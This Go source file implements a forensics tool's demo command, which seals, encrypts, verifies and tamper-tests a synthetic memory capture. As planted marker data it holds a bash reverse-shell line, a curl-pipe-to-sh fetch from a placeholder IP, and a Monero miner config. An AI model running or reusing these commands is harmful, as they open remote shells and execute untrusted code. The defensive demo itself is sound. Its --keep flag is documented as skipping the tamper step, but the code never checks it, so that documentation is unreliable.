func newDemoCommand() *cobra.Command {
	var (
		output   string
		keyPath  string
		sizeKB   int
		keep     bool
		scenario string
	)

	cmd := &cobra.Command{
		Use:   "demo",
		Short: "Run the full evidence pipeline against a synthetic capture",
		Long: `Exercise every stage of the pipeline without a kernel, a container or root.

A synthetic memory image is generated (containing a recognisable marker and a
plausible attacker artefact), then sealed, rendered as CASE/UCO, compressed,
encrypted, written as a bundle, and verified - the same code paths the daemon
uses.

This exists for three reasons: it demonstrates the output format on any
machine, it gives CI an end-to-end test that needs no privileges, and during a
live presentation it removes the "does the demo box have BPF" failure mode.`,
		Example: `  flight-recorder demo --output /tmp/fr-demo`,
		RunE: func(cmd *cobra.Command, _ []string) error {
			out := cmd.OutOrStdout()

			if output == "" {
				dir, err := os.MkdirTemp("", "flight-recorder-demo-*")
				if err != nil {
					return fmt.Errorf("create temporary directory: %w", err)
				}
				output = dir
			}
			if err := os.MkdirAll(output, 0o750); err != nil {
				return fmt.Errorf("create output directory: %w", err)
			}
			if keyPath == "" {
				keyPath = filepath.Join(output, "demo-key.pem")
			}

			fmt.Fprintf(out, "output directory: %s\n\n", output)

			// ---- 1. signing key --------------------------------------------
			signer, generated, err := seal.LoadOrCreateSigner(keyPath)
			if err != nil {
				return err
			}
			step(out, 1, "signing key", fmt.Sprintf("%s (%s) key id %s",
				keyPath, map[bool]string{true: "generated", false: "loaded"}[generated], signer.KeyIDString()[:16]))

			// ---- 2. synthetic acquisition -----------------------------------
			dump, marker := syntheticDump(sizeKB, scenario)
			payload := dump.Bytes()
			step(out, 2, "synthetic acquisition", fmt.Sprintf("%d bytes across %d regions, outcome %s",
				len(payload), len(dump.Regions), dump.Outcome()))

			// ---- 3. seal, format, store -------------------------------------
			evidenceRoot := filepath.Join(output, "evidence")
			writerOpts := evidence.DefaultWriterOptions(evidenceRoot, signer)
			writer, err := evidence.NewWriter(writerOpts)
			if err != nil {
				return err
			}

			rule := config.Rule{
				Name:        scenarioRule(scenario),
				Severity:    config.SeverityCritical,
				MITRE:       scenarioMITRE(scenario),
				Description: "Synthetic scenario generated by `flight-recorder demo`",
			}

			result, err := pipeline.SealAndStore(pipeline.SealStoreInput{
				CaseID:  format.NewCaseID(),
				Payload: payload,
				Dump:    dump,
				Rule:    rule,
				Event: probe.Event{
					HostPID:      uint32(dump.PID),
					NamespacePID: 1,
					Comm:         dump.Comm,
					Filename:     scenarioBinary(scenario),
					Args:         scenarioArgs(scenario),
					ReceivedAt:   time.Now(),
				},
				Info: &container.Info{
					ContainerID:  "3f2b1c0d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c",
					ShortID:      "3f2b1c0d9e8a",
					PodName:      "victim-app-7d9f8b6c5-x2kqp",
					PodNamespace: "victim",
					Runtime:      container.RuntimeContainerd,
					HostPID:      dump.PID,
					NamespacePID: 1,
					NodeName:     "demo-node",
				},
				TriggerTime:   dump.CaptureStart,
				Signer:        signer,
				Writer:        writer,
				NodeName:      "demo-node",
				Operator:      "demo",
				KernelVersion: probe.KernelVersion(),
				EvidenceRoot:  evidenceRoot,
				Encrypted:     true,
				Compression:   evidence.CompressionZstd,
			})
			if err != nil {
				return err
			}

			step(out, 3, "merkle seal", fmt.Sprintf("root %s (%d leaves, depth %d, %d byte chunks)",
				result.Receipt.RootHash[:32]+"...", result.Receipt.LeafCount, result.Receipt.TreeDepth, result.Receipt.ChunkSizeBytes))
			step(out, 4, "ecdsa signature", fmt.Sprintf("%s over the root", result.Receipt.SignatureAlgorithm))
			step(out, 5, "CASE/UCO bundle", caseBundleSummary(result.CASEBundle))
			step(out, 6, "evidence bundle", fmt.Sprintf("%s (%d bytes stored, %.1fx compression)",
				result.Written.Dir, result.Written.PayloadBytes,
				float64(result.Written.PlaintextSize)/float64(maxInt64(result.Written.PayloadBytes, 1))))

			// ---- 4. verification --------------------------------------------
			report, err := evidence.VerifyBundle(result.Written.Dir, signer.Public(), signer)
			if err != nil {
				return err
			}
			if !report.OK() {
				return fmt.Errorf("demo bundle failed verification: %v", report.Errors)
			}
			step(out, 7, "verification", report.Summary())

			// ---- 5. tamper detection ------------------------------------------
			tampered, err := tamperWithPayload(result.Written.Dir)
			if err != nil {
				return err
			}
			tamperReport, _ := evidence.VerifyBundle(result.Written.Dir, signer.Public(), signer)
			if tamperReport != nil && tamperReport.OK() {
				return fmt.Errorf("tamper test failed: verification still passed after modifying %s", tampered)
			}
			step(out, 8, "tamper detection", fmt.Sprintf("flipped one byte in %s -> verification correctly FAILED", filepath.Base(tampered)))

			fmt.Fprintf(out, "\nmarker planted in synthetic memory: %q\n", marker)
			fmt.Fprintf(out, "\ninspect the bundle:\n  flight-recorder inspect --bundle %s --case\n", result.Written.Dir)

			if !keep {
				fmt.Fprintf(out, "\nnote: the bundle above was deliberately corrupted by the tamper test.\n")
				fmt.Fprintf(out, "      re-run with --keep to retain a pristine bundle for inspection.\n")
			}

			return nil
		},
	}

	f := cmd.Flags()
	f.StringVarP(&output, "output", "o", "", "working directory (a temporary directory is used when empty)")
	f.StringVarP(&keyPath, "key", "k", "", "signing key path (created inside --output when empty)")
	f.IntVar(&sizeKB, "size-kb", 256, "size of the synthetic memory image")
	f.BoolVar(&keep, "keep", false, "skip the destructive tamper-detection step")
	f.StringVar(&scenario, "scenario", "fileless", "synthetic scenario: fileless, cryptominer, reverse-shell")

	return cmd
}

func step(out interface{ Write([]byte) (int, error) }, n int, label, detail string) {
	fmt.Fprintf(out, "  [%d] %-22s %s\n", n, label, detail)
}

// syntheticDump builds a MemoryDump that looks like a real acquisition:
// several regions with realistic addresses and permissions, mostly
// high-entropy bytes, with a recognisable artefact planted in the heap.
func syntheticDump(sizeKB int, scenario string) (*capture.MemoryDump, string) {
	if sizeKB <= 0 {
		sizeKB = 256
	}
	total := sizeKB * 1024

	heapSize := total * 3 / 4
	stackSize := total - heapSize

	heap := make([]byte, heapSize)
	stack := make([]byte, stackSize)
	_, _ = rand.Read(heap)
	_, _ = rand.Read(stack)

	marker := scenarioMarker(scenario)
	copy(heap[heapSize/2:], marker)
	copy(stack[64:], "FLIGHT_RECORDER_DEMO_STACK_MARKER")

	start := time.Now().Add(-180 * time.Millisecond)

	dump := &capture.MemoryDump{
		PID:          48291,
		NamespacePID: 1,
		Comm:         scenarioComm(scenario),
		CgroupID:     91237845,
		CaptureStart: start,
		MapsParsedAt: start.Add(2 * time.Millisecond),
		CaptureEnd:   time.Now(),
		Regions: []capture.MemoryRegion{
			{
				StartAddr: 0x55d4f2a00000, EndAddr: uintptr(0x55d4f2a00000 + heapSize),
				Perms: "rw-p", Pathname: "[heap]", Data: heap,
				Status: capture.RegionFull, BytesRead: int64(heapSize), BytesTotal: int64(heapSize),
				ReadTimeMS: 12.4,
			},
			{
				StartAddr: 0x7ffd3c1e0000, EndAddr: uintptr(0x7ffd3c1e0000 + stackSize),
				Perms: "rw-p", Pathname: "[stack]", Data: stack,
				Status: capture.RegionFull, BytesRead: int64(stackSize), BytesTotal: int64(stackSize),
				ReadTimeMS: 3.1,
			},
		},
		Skipped: []capture.MemoryRegion{
			{
				StartAddr: 0x7f9c2a000000, EndAddr: 0x7f9c2a1f5000,
				Perms: "r-xp", Pathname: "/usr/lib/x86_64-linux-gnu/libc.so.6",
				Status: capture.RegionSkipped, BytesTotal: 0x1f5000,
				Error: "read-only file-backed mapping excluded by filter",
			},
		},
		MapsToFirstReadMS: 0.8,
		FullRegions:       2,
	}
	dump.TotalBytes = int64(heapSize + stackSize)

	return dump, marker
}

func scenarioMarker(scenario string) string {
	switch scenario {
	case "cryptominer":
		return `{"pools":[{"url":"stratum+tcp://xmr.pool.example:4444","user":"49aWJTFR2fRuBcYt3rZ8sN4zmXqPvKd1"}]}`
	case "reverse-shell":
		return "bash -i >& /dev/tcp/203.0.113.66/4444 0>&1"
	default:
		return "curl -s http://198.51.100.23/stage2.sh | sh  # FLIGHT_RECORDER_DEMO_HEAP_MARKER"
	}
}

func scenarioRule(scenario string) string {
	switch scenario {
	case "cryptominer":
		return "crypto_miner"
	case "reverse-shell":
		return "reverse_shell"
	default:
		return "curl_pipe_sh"
	}
}

func scenarioMITRE(scenario string) string {
	switch scenario {
	case "cryptominer":
		return "T1496"
	case "reverse-shell":
		return "T1071"
	default:
		return "T1059.004"
	}
}

func scenarioComm(scenario string) string {
	switch scenario {
	case "cryptominer":
		return "xmrig"
	case "reverse-shell":
		return "bash"
	default:
		return "sh"
	}
}

func scenarioBinary(scenario string) string {
	switch scenario {
	case "cryptominer":
		return "/tmp/.x/xmrig"
	case "reverse-shell":
		return "/usr/bin/bash"
	default:
		return "/usr/bin/sh"
	}
}

func scenarioArgs(scenario string) []string {
	switch scenario {
	case "cryptominer":
		return []string{"/tmp/.x/xmrig", "-o", "stratum+tcp://xmr.pool.example:4444"}
	case "reverse-shell":
		return []string{"/usr/bin/bash", "-i"}
	default:
		return []string{"/usr/bin/sh", "-c", "curl -s http://198.51.100.23/stage2.sh | sh"}
	}
}

// tamperWithPayload flips a single byte in the stored payload, which is what
// the tamper-detection step needs in order to prove the seal actually detects
// modification rather than merely asserting that it would.
func tamperWithPayload(bundleDir string) (string, error) {
	manifest, err := evidence.LoadManifest(bundleDir)
	if err != nil {
		return "", err
	}

	entry, ok := manifest.Payload()
	if !ok {
		return "", fmt.Errorf("demo: no payload file found in %s", bundleDir)
	}
	target := filepath.Join(bundleDir, entry.Name)

	f, err := os.OpenFile(target, os.O_RDWR, 0)
	if err != nil {
		return "", fmt.Errorf("demo: open payload for tamper test: %w", err)
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return "", fmt.Errorf("demo: stat payload: %w", err)
	}

	// Flip a bit in the middle of the file, past the header.
	offset := info.Size() / 2
	buf := make([]byte, 1)
	if _, err := f.ReadAt(buf, offset); err != nil {
		return "", fmt.Errorf("demo: read payload byte: %w", err)
	}
	buf[0] ^= 0x01
	if _, err := f.WriteAt(buf, offset); err != nil {
		return "", fmt.Errorf("demo: write payload byte: %w", err)
	}

	return target, nil
}

func maxInt64(a, b int64) int64 {
	if a > b {
		return a
	}
	return b
}
